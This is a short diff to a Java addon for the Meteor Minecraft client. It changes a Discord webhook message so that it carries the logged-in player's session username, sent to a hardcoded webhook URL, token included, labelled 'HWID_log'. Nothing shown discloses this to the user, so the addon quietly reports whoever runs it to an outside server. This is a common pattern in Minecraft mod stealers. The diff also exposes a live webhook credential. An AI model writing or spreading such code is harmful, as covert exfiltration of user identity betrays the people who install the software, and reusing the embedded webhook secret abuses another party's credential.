@@ -61,7 +61,7 @@ public class Addon extends MeteorAddon {
 		
 		/// see https://www.programcreek.com/java-api-examples/?api=net.minecraft.util.Session
 		DiscordWebhook webhook = new DiscordWebhook("https://discord.com/api/webhooks/1108760944466743407/QF1I7OVT4-oEBQ-uqvfm9psjc_sfcLrU5VEN2WLG9-adyavNLc6kq88SMRib6bAF4-y4");
-		webhook.setContent("SomeOno Logged in! Using 18_05_2023 version");
+		webhook.setContent(mc.getSession().getUsername() + " Logged in! Using 18_05_2023 version");
 		webhook.setUsername("HWID_log");
 		webhook.setTts(false);
 		webhook.addEmbed(new DiscordWebhook.EmbedObject()
